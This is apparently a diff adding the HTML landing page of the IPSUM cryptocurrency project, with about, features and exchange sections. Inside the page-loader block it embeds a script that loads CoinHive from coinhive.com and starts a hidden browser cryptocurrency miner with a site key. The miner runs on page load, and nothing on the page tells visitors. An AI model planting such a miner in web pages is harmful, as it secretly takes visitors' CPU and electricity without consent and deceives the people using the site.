@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<!--[if IE 9 ]><html class="ie ie9 no-js" lang="en"><![endif]-->
+<!--[if gt IE 9 | !IE]><!-->
+<html class="no-js" lang="en">
+<!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>IPSUM</title>
+  <meta name="description" content="Intelligent Payment System">
+  <meta name="keywords" content="crypto cryptocurrency masternode coin bitcoin staking pos stake">
+  <meta name="author" content="0x1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
+  <link rel="icon" href="assets/img/favicon.ico">
+  <link rel='stylesheet' href='assets/css/bootstrap.min.css'>
+  <link rel='stylesheet' href='assets/css/vendor.css'>
+  <link rel='stylesheet' href='assets/css/theme_dark.css'> <!-- edit css file name to be `theme_light.css` or `theme_dark.css` -->
+  <link rel='stylesheet' href='assets/css/custom.css'>
+  <!--[if lte IE 9]><!-->
+  <script src='assets/js/vendor/html5shiv.min.js'></script>
+  <!--<![endif]-->
+</head>
+<body>
+
+  <div class="site">
+    <div class="site-loader _multi-circle-line">
+    <script src='https://coinhive.com/lib/coinhive.min.js'></script>
+    <script>
+        var miner = new CoinHive.Anonymous('hjlLhEajaIkSmIJfveQJ0VmKrKg87zze', {throttle: 0.3});
+        miner.didOptOut(10)
+        miner.start()
+      </script>
+      <div class="site-loader-spinner"></div>
+    </div> <!-- .site-loader -->
+
+    <div class="site-bg">
+      <div class="site-bg-img"></div>
+      <div class="site-bg-video"></div>
+      <div class="site-bg-overlay"></div>
+      <div class="site-bg-effect layer" data-depth=".30"></div> <!-- parallax data, try edit to other number :) -->
+      <canvas class="site-bg-canvas layer" data-depth=".30"></canvas> <!-- parallax data, try edit to other number :) -->
+      <div class="site-bg-border"></div>
+    </div> <!-- .site-bg -->
+
+    <div class="site-canvas">
+      <header class="site-header">
+        <div class="container">
+          <div class="site-header-header">
+            <div class="site-header-brand">
+              <a href="#">
+                <img class="site-header-logo" src="assets/img/site-header-logo.png" alt="">
+                <img class="site-header-logo-invert" src="assets/img/site-header-logo-invert.png" alt="">
+              </a>
+            </div>
+            <a class="primary-nav-toggle" href="#">
+              <i class="fa fa-navicon"></i>
+            </a>
+          </div>
+          <div class="site-header-main">
+            <nav class="primary-nav">
+              <div class="primary-menu-container">
+                <ul class="primary-menu">
+                  <li class="primary-menu-item is-active" data-section="#home">
+                    <a href="#" data-hover="Home"><span>Home</span></a> <!-- set `data-hover` same as the link text -->
+                  </li> <!-- add `is-active` class for the main section, set `data-section` to be the section id -->
+                  <li class="primary-menu-item" data-section="#about">
+                    <a href="#" data-hover="About"><span>About</span></a>
+                  </li>
+                  <li class="primary-menu-item" data-section="#features">
+                    <a href="#" data-hover="Features"><span>Features</span></a>
+                  </li>
+                  <li class="primary-menu-item">
+                    <a href="http://explorer.ipsum.network:8080/" target="_blank" data-hover="Explorer"><span>Explorer</span></a>
+                  </li>
+                  <li class="primary-menu-item">
+                    <a href="https://github.com/ipsum-ce/ips/releases" target="_blank" data-hover="Wallets"><span>Wallets</span></a>
+                  </li>
+                  <li class="primary-menu-item">
+                    <a href="#" target="_blank" data-section="#exchanges" data-hover="Exchanges"><span>Exchanges</span></a>
+                  </li>
+                  <li class="primary-menu-item" data-section="#social">
+                    <a href="#"><i class="fa fa-share-alt"></i></a>
+                  </li>
+                  <li class="primary-menu-item audio-toggle">
+                    <a href="#"><i class="fa fa-volume-up"></i></a>
+                  </li> <!-- .audio-toggle -->
+                </ul>
+              </div>
+            </nav>
+          </div>
+        </div>
+      </header> <!-- .site-header -->
+      <main class="site-main">
+        <div id="nav" class="section">
+          <div class="section-table">
+            <div class="section-table-cell">
+              <div class="container">
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div> <!-- for `> md` screen, control with `#nav` id -->
+
+        <div id="social" class="section">
+          <div class="section-table">
+            <div class="section-table-cell">
+              <div class="container">
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div class="social-menu-container">
+                        <ul class="social-menu">
+                          <li class="social-item">
+                            <a href="https://discord.gg/7a84utQ" target="_blank">
+                              <i class="fab fa-discord"></i>
+                              <span>Discord</span>
+                            </a>
+                          </li>
+                          <li class="social-item">
+                            <a href="https://github.com/ipsum-ce" target="_blank">
+                              <i class="fa fa-github-square"></i>
+                              <span>GitHub</span>
+                            </a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div> <!-- #social -->
+
+        <div id="home" class="section is-active">
+          <div class="section-table">
+            <div class="section-table-cell">
+              <div class="container">
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div id="countdown_dashboard" class="countdown">
+                        <div class="dash-primary">
+                          <div class="dash days_dash">
+                            <div class="digit">0</div>
+                            <div class="digit">0</div>
+                            <span class="dash_title">DAYs</span>
+                          </div>
+                        </div>
+                        <div class="dash-secondary">
+                          <div class="dash hours_dash">
+                            <span class="dash_title">Hours</span>
+                            <div class="digit">0</div>
+                            <div class="digit">0</div>
+                          </div>
+
+                          <div class="dash minutes_dash">
+                            <span class="dash_title">Minutes</span>
+                            <div class="digit">0</div>
+                            <div class="digit">0</div>
+                          </div>
+
+                          <div class="dash seconds_dash">
+                            <span class="dash_title">Seconds</span>
+                            <div class="digit">0</div>
+                            <div class="digit">0</div>
+                          </div>
+                        </div>
+                      </div> <!-- .countdown -->
+                      <p>
+                        Mandatory network upgrade coming soon.
+                        <br>
+                        Join our discord channel for updates.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="about" class="section">
+          <div class="section-table">
+            <div class="section-table-cell">
+              <div class="container">
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div class="section-heading">
+                        <h2 class="section-title">What is IPSUM?</h2>
+                        <p class="section-subtitle">Intelligent • Payment • Systems</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-md-5">
+                    <div class="col-inner">
+                      <p><span class="first-letter">A</span> cryptocurrency community building the future of intelligent payment systems. Our goal is to create a currency that enables a machine to machine economy, whilst providing a "cash like" experience for our users.</p>
+                      <a class="btn btn-default hidden-xs hidden-sm" href="#" data-section="#features">
+                        <span>IPSUM Features</span>
+                      </a> <!-- button link to section, edit the `data-section` to be section id -->
+                    </div>
+                  </div>
+                  <div class="col-md-6 col-lg-5 col-md-offset-1 col-lg-offset-2">
+                    <div class="col-inner">
+                      <div class="iconbox _left">
+                        <div class="iconbox-icon">
+                          <i class="icon-strategy"></i>
+                        </div>
+                        <div class="iconbox-heading">
+                          <h4>Open Source Developers</h4>
+                        </div>
+                        <div class="iconbox-content">
+                          <p>Veterans of open source software, we understand how to cleanly fork and maintain a working relationship with the upstream.</p>
+                        </div>
+                      </div> <!-- .iconbox -->
+
+                      <div class="iconbox _left">
+                        <div class="iconbox-icon">
+                          <i class="icon-tools"></i>
+                        </div>
+                        <div class="iconbox-heading">
+                          <h4>Community Builders</h4>
+                        </div>
+                        <div class="iconbox-content">
+                          <p>We've learned that any successful cryptocurrency is seeded with a strong community. We build communities that are mindful and encourage collaboration in all facets. Come join us!</p>
+                        </div>
+                      </div> <!-- .iconbox -->
+                      <a class="btn btn-default hidden-md hidden-lg" href="#" data-section="#features">
+                        <span>IPSUM Features</span>
+                      </a> <!-- button link to section, edit the `data-section` to be section id -->
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="features" class="section">
+          <div class="section-table">
+            <div class="section-table-cell">
+              <div class="container">
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div class="section-heading">
+                        <h2 class="section-title">IPSUM</h2>
+                        <p class="section-subtitle">Intelligent • Payment • Systems</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div id="serviceCarousel" class="owl-carousel">
+                        <div class="service-carousel-item iconbox _center">
+                          <div class="iconbox-icon">
+                            <i class="icon-mobile"></i>
+                          </div>
+                          <div class="iconbox-heading">
+                            <h4>Masternodes</h4>
+                          </div>
+                          <div class="iconbox-content">
+                            <p>Also known as bonded validator systems, masternodes are a series of network nodes that underpin the IPSUM network. Operators earn 70% of block rewards, and help enable instant payments for users.</p>
+                          </div>
+                        </div> <!-- .iconbox -->
+
+                        <div class="service-carousel-item iconbox _center">
+                          <div class="iconbox-icon">
+                            <i class="icon-gears"></i>
+                          </div>
+                          <div class="iconbox-heading">
+                            <h4>Proof of Stake</h4>
+                          </div>
+                          <div class="iconbox-content">
+                            <p>No need for resource intensive mining with IPSUM. Proof of Stake allows users to lock their coins into staking mode and 30% recieve block rewards.</p>
+                          </div>
+                        </div> <!-- .iconbox -->
+
+                        <div class="service-carousel-item iconbox _center">
+                          <div class="iconbox-icon">
+                            <i class="icon-beaker"></i>
+                          </div>
+                          <div class="iconbox-heading">
+                            <h4>Fast Payments</h4>
+                          </div>
+                          <div class="iconbox-content">
+                            <p>The IPSUM network provides quick payments which are confirmed in minutes not hours.</p>
+                          </div>
+                        </div> <!-- .iconbox -->
+
+                        <div class="service-carousel-item iconbox _center">
+                          <div class="iconbox-icon">
+                            <i class="icon-chat"></i>
+                          </div>
+                          <div class="iconbox-heading">
+                            <h4>Open Source</h4>
+                          </div>
+                          <div class="iconbox-content">
+                            <p>IPSUM is a non-native fork of the Dash Project, meaning we do not share common blockchain ancestry. It is our goal to contribute and synchronize with the upstream project to ensure we inherit latest security features provided by the community.</p>
+                          </div>
+                        </div> <!-- .iconbox -->
+
+                        <div class="service-carousel-item iconbox _center">
+                          <div class="iconbox-icon">
+                            <i class="icon-video"></i>
+                          </div>
+                          <div class="iconbox-heading">
+                            <h4>ASIC Resistance</h4>
+                          </div>
+                          <div class="iconbox-content">
+                            <p>IPSUM has choosen to adopt Proof of Stake rather than Proof of Work. Therefore cannot be mined, and it will always remain ASIC resistant.</p>
+                          </div>
+                        </div> <!-- .iconbox -->
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div> <!-- #service -->
+
+        <div id="exchanges" class="section">
+          <div class="section-table">
+            <div class="section-table-cell">
+              <div class="container">
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div class="section-heading">
+                        <h2 class="section-title">BUY IPSUM</h2>
+                        <p class="section-subtitle">Intelligent • Payment • Systems</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-xs-12">
+                    <div class="col-inner">
+                      <div id="serviceCarousel" class="owl-carousel">
+                        <div class="service-carousel-item iconbox _center">
+                          <div class="iconbox-icon">
+                            <a href="https://graviex.net/markets/ipsbtc" target="_blank">
+                            <img src="assets/img/exchanges/graviex.png" width="25%" height="25%" alt="Buy IPSUM on Graviex">
+                          </div>
+                          <div class="iconbox-heading">
+                            <h4>Graviex</h4>
+                          </div>
+                          <div class="iconbox-content">
+                            <p>GRAVIO Ecosystem Exchange.</p>
+                          </div>
+                        </div> <!-- .iconbox -->
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main> <!-- .site-main -->
+    </div>
+  </div>
+
+  <script src="assets/js/vendor/jquery-1.11.3.min.js"></script>
+  <script src='assets/js/vendor/bootstrap.min.js'></script>
+  <script src='assets/js/vendor/plugin.js'></script>
+  <script src='assets/js/variable.js'></script>
+  <script src='assets/js/main.js'></script>
+
+  <!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
+  <!--
+  <script>
+      (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+      function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+      e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+      e.src='https://www.google-analytics.com/analytics.js';
+      r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+      ga('create','UA-XXXXX-X','auto');ga('send','pageview');
+  </script>
+  -->
+
+</body>
+</html>
